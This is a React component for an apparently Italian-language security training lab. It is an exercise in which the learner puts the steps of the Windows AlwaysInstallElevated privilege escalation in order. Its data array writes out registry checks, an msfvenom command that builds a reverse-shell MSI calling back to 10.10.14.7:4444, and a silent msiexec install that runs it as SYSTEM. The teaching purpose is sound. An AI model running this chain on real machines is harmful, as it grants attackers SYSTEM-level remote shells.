import { useEffect, useState } from "react";
import { ArrowDown } from "lucide-react";
import { Button } from "@/components/ui/button";
import { InfoNote, SuccessNote, WarnNote } from "@/components/lab/Feedback";
import { cn } from "@/lib/utils";
import type { TaskContext } from "../../types";

const STEPS = [
  { id: "s1", text: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", order: 1, note: "→ 0x1" },
  { id: "s2", text: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", order: 2, note: "→ 0x1" },
  { id: "s3", text: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f msi -o shell.msi", order: 3, note: "crea l'MSI" },
  { id: "s4", text: "msiexec /quiet /qn /i shell.msi", order: 4, note: "installa come SYSTEM" },
];

export default function Task06AlwaysInstall({ markComplete, isComplete }: TaskContext) {
  const [pool, setPool] = useState(() => [...STEPS].sort(() => Math.random() - 0.5));
  const [seq, setSeq] = useState<typeof STEPS>([]);
  const [checked, setChecked] = useState(false);
  const correct = seq.length === STEPS.length && seq.every((s, i) => s.order === i + 1);
  useEffect(() => { if (checked && correct) markComplete(); }, [checked, correct, markComplete]);

  const push = (id: string) => { const s = pool.find((x) => x.id === id); if (!s) return; setSeq([...seq, s]); setPool(pool.filter((x) => x.id !== id)); setChecked(false); };
  const pop = (id: string) => { const s = seq.find((x) => x.id === id); if (!s) return; setPool([...pool, s]); setSeq(seq.filter((x) => x.id !== id)); setChecked(false); };
  const reset = () => { setPool([...STEPS].sort(() => Math.random() - 0.5)); setSeq([]); setChecked(false); };

  return (
    <div>
      <div className="grid min-w-0 gap-4 md:grid-cols-2">
        <div className="min-w-0 rounded-xl border border-border bg-surface p-4">
          <div className="mb-2 font-mono text-xs uppercase tracking-widest text-muted-foreground">Passaggi disponibili</div>
          <div className="space-y-2">
            {pool.map((s) => (
              <button key={s.id} onClick={() => push(s.id)} className="block w-full min-w-0 rounded-md border border-border bg-background p-3 text-left font-mono text-[12px] text-foreground hover:border-accent/50 break-all [overflow-wrap:anywhere]">{s.text}</button>
            ))}
            {pool.length === 0 && <div className="rounded-md border border-dashed border-border p-3 text-xs text-muted-foreground">Tutti sistemati.</div>}
          </div>
        </div>
        <div className="min-w-0 rounded-xl border border-border bg-surface p-4">
          <div className="mb-2 font-mono text-xs uppercase tracking-widest text-muted-foreground">Piano (in ordine)</div>
          <div className="space-y-2">
            {seq.map((s, i) => (
              <div key={s.id}>
                <button onClick={() => pop(s.id)} className={cn("block w-full min-w-0 rounded-md border p-3 text-left font-mono text-[12px] transition break-all [overflow-wrap:anywhere]", checked ? (s.order === i + 1 ? "border-success/60 bg-success/5" : "border-destructive/60 bg-destructive/5") : "border-accent/40 bg-accent/5 text-foreground")}>
                  <span className="mr-2 text-accent">{i + 1}.</span>{s.text}
                  <div className="mt-1 text-[10px] text-muted-foreground">{s.note}</div>
                </button>
                {i < seq.length - 1 && <div className="my-1 flex justify-center"><ArrowDown className="h-4 w-4 text-muted-foreground" /></div>}
              </div>
            ))}
            {seq.length === 0 && <div className="rounded-md border border-dashed border-border p-3 text-xs text-muted-foreground">Aggiungi i passaggi nell'ordine corretto.</div>}
          </div>
        </div>
      </div>
      <div className="mt-4 flex gap-2">
        <Button disabled={seq.length !== STEPS.length} onClick={() => setChecked(true)}>Verifica</Button>
        <Button variant="outline" onClick={reset}>Ricomincia</Button>
      </div>
      {!checked && <InfoNote>Prima verifichi che entrambe le chiavi siano a 1, poi prepari l'MSI, poi lo installi.</InfoNote>}
      {checked && !correct && <WarnNote>Ordine sbagliato: prima le due query, poi msfvenom, poi msiexec.</WarnNote>}
      {isComplete && <SuccessNote>MSI installato con /quiet: shell inversa aperta come NT AUTHORITY\SYSTEM.</SuccessNote>}
    </div>
  );
}
